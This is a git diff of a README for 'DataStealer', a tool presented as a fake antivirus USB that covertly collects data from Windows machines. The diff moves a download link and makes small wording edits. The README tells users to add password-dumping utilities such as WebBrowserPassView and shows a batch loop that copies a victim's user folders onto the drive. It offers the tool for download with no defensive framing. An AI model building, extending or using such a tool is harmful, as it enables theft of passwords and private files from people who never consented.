@@ -1,5 +1,8 @@
 # DataStealer
 
+## Download
+[Releases](https://github.com/Kevinsillo/datastealer/releases)
+
 ## Information
 DataStealer is a simple funcionality for USB device (fake Antivirus USB) to gather information in Windows systems.
 
@@ -36,10 +39,10 @@ You can change diferents values in **run.bat**.
 >
 >set soft=**[names of Nirsoft software files]** [DEFAULT EMPTY]
 
-**NirSoft** web site provides a unique collection of **small and useful freeware utilities**, all of them developed by **Nir Sofer**. Go to nirsoft.net, download software and put in "data/soft/" folder. Later add names in value with spaces.
+**NirSoft** web site provides a unique collection of **small and useful freeware utilities**, all of them developed by **Nir Sofer**. Go to **[nirsoft.net](www.nirsoft.net)**, download software and put in "data/soft/" folder. Later add names in value with spaces.
 
 ***Example:***
->set soft=**SkypeLogView WebBrowserPassView**
+>set soft=**SkypeLogView WebBrowserPassView ...**
 
 ### Folders (Advanced Users)
 If you want you can add lines with more folders in **"run.bat"** for gather information.
@@ -48,6 +51,3 @@ If you want you can add lines with more folders in **"run.bat"** for gather info
 >FOR /R **"%userprofile%\Pictures\"** %%a IN (%formats%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
 
 Replace **"%userprofile%\Pictures\"** for any folder from Windows.
-
-# Download
-[Releases](https://github.com/Kevinsillo/datastealer/releases)
